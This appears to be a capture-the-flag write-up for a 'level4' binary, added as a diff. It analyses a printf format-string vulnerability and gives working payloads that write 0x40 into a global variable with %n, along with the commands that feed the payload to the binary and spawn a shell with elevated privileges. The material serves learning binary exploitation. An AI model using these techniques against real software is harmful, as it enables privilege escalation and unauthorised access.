@@ -1,0 +1,43 @@
+
+nm:
+0804988c B m
+0804851a T main
+080484a4 T v
+
+disas v:
+  call   fgets(buffer)
+  call   printf(buffer)
+  cmp    m, 0x40
+  jne    return
+  call   system("/bin/sh")
+  return
+
+Executable has uninitialized global m.
+If we manage to get 0x40 in it the binary
+opens up a new shell with bin's euid.
+
+Printf if called with our inputed string and no vararg.
+This is a format string exploit.
+
+When no vararg are given to corespond to a format string flag,
+printf implicitly fetches them on the stack.
+We can explore the stack on to our input buffer.
+
+One of printf flags writes in a given address.
+%n   -> will write the number of characters printed so far.
+%.0s -> will discard vararg
+We have to ouput 0x40 characters then use %n on &m to succeed.
+
+Thus:
+"\x8c\x98\x04\x08" + "%60x%4$n"
+#> python -c 'print format' > /tmp/l3
+#> time cat /tmp/l3 - | ./level4
+
+
+previous solution, less elegant
+##################################################
+# "\x8c\x98\x04\x08" + "A"*60 + "%.0s%.0s%.0s%n" #
+#  ----------------    ------    ------------    #
+#         &m            fill        offset       #
+##################################################
+
